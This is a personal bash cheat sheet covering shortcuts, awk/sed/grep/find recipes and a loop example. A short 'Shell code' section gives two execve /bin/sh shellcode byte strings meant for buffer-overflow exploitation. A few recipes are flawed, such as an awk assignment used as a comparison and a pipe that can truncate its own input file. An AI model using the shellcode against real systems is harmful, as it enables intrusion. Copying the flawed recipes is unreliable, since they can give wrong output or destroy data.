# Bash Navigation

* `Ctrl A`: Move to the beginning of the command
* `Ctrl E`: Move to the end of the command
* `Alt F`: Move forward one word in command line 
* `Alt B`: Move backward one word in command line 

* Clear from cursor to the beginning of a line
```bash
CTRL + u
```

* Clear from cursor to the end of a line
```bash
CTRL + k
```

* Clears one character to the right of cursor (WARNING: will close the current session when the command line is empty!)
```bash
CTRL + d
```

* Clears one word to the left of the cursor
```bash
ESC + Backspace
```
```bash
CTRL + w
```

* Clears one word to the right of the cursor
```bash
ESC + d
```

* Types x number of the same character!! very useful for buffer overflow
```bash
ESC + x + character
```

## Reverse Search
* `Ctrl R`: Start reverse search
* `Ctrl R`: Once started, will bring you to the next recent match
* `Ctrl G`: Quits reverse search, and preserve the command already typed



# Bash scripting
* `$1`, `$2`, `$3`... are the parameters
* `"$@"` is an array of all parameters. Can expanded as "$1" "$2" "$3" ... when you print it
* `"$*"` is the `IFS`, Internal Field Separator, expansion of all parameters into one variable with IFS in between. (pretty useful)
* `$#` gives the number of parameters
* `$0` gives the name of the shell script



# String Manipulation
* `awk` with print. prints first field.
```bash
echo "Hello World" | awk '{print $1}'
```

* `echo` with `-e` interpretation of back slashes
```bash
echo -e "Hello \n World"
```

* `cut` (returns Hello) `-d`: deliminator, `-f`: field (fields are indexed from `1`)
```bash
echo "Hello World" | cut -d ' ' -f 1
```

* `awk`, prints the rest of the argument. `$1` the first word, `$0` is the entire line.
```bash
awk '{$1 = ""; print $0;}'
```

* `awk` prints even number line of an input file, and it execute the default rule for them `{print $0}`
```bash
awk 'NR%2==0' INPUT.txt
```

* `tr`: translates and/or deletes chars from `stdin`, and writes to `stdout`. `-d`: deletes all occurrence, `-s`: make repeated sequential characters only appear once
```bash
tr [a-z] [A-Z] < lowercase.txt > uppercase.txt
cat file.txt | tr -d ' '
cat file.txt | tr -s '.'
```

* `paste` merges lines of files

* `cut` with tabs; `cut` by default split by tabs...
```bash
cat FILE | cut -d $'\t' -f 2
```
```
cat FILE | cut -f 2
```

* Print out the content of a file at `LINE` number `-n` in sed is quiet, `p`: print
```bash
awk 'NR=LINE{print}' FILE
sed -n -e LINEp FILE
sed -n LINEp FILE
sed -n 'LINE{p;q}' FILE
```

* Print out a range of line of a file
```bash
sed -n -e '100,110 p' FILE
sed -n 100,110p FILE
```

* Prints every line multiple times
```bash
sed 'p;p;p;' FILE | tee -a FILE; shuf FILE -o FILE
awk '1;1;1;1;' FILE | tee FILE; shuf FILE -o FILE
```


# Search Manipulation
* `grep` multiple words without storing them to a file 
```bash
grep "word1\|word2"
```
* `grep` with `-A NUM`, prints `NUM` lines after match, `-B`, prints lines Before the match, `-C NUM` prints before AND after the match
```bash
grep target_word -C 2
```

* `grep` Search a string in current directory. `-w` stand for whole word, `-r` recursive, `-e` regular expression
```bash
grep -rnw . -e "STRING"
```

*  `grep`:  `-i` ignore case, `-l` output filename that match, `-L` filename that doesn't match
```bash
grep -r --include '*.py' STRING .
```

* `grep` with `-o` only output the match parts, `-h` only outputs the result without file name, `-f` indicates the fileanme of the list of words to grep for


* `find` all mp3 files in current directory and create a playlist. `\;` denotes the end of command
```bash
find . -maxdepth 1 -name "*.mp3" -exec echo "play" {} \; > playlist
```

* `find` all file with certain extension
```bash
find `pwd` -type f -name "*.txt"
```

* `grep` exclude a file of strings
```bash
grep -avf "FILE.txt"
```

* `xargs` usage, useful pipes, but require the flag `-print0`, `-I`: replaces occurrence of replace-str in the initial arguments with names read from stdin
```bash
find . -type f -name "*.mp3" -print0 | xargs -0 -I file cp file dir/
```
```
ls | grep mp3 | xargs -I file cp file dir/
ls | grep -avf "BLACKLIST" | xargs -I file COMMANDS file
```

* Print out the content of a file at LINE number; `-n`: quiet, `p`: print
```bash
awk 'NR=LINE{print}' FILE
sed -n -e LINEp FILE
sed -n LINEp FILE
sed -n 'LINE{p;q}' FILE
```

* Print out a range of line of a file
```bash
sed -n -e '100,110 p' FILE
sed -n 100,110p FILE
```

* Output the first `X` line of a file
```bash
sed 'X{p;q}' FILE
head -n X FILE
```

* Getting the exact number of line from the bottom or the top of a output (In this case, 2nd line from the bottom)
(WARNING: THIS ONLY WORK ONCE HAHA, )
```bash
history | grep clone | tail -n 2 | head -n 1
```

# Shell code
```
sh=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

sh=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" (27 bytes)
```

# For loop in bash
```
for value in {1..5}
do
    echo $value
done
echo Will print 5 numbers starting from 1 to 5
```
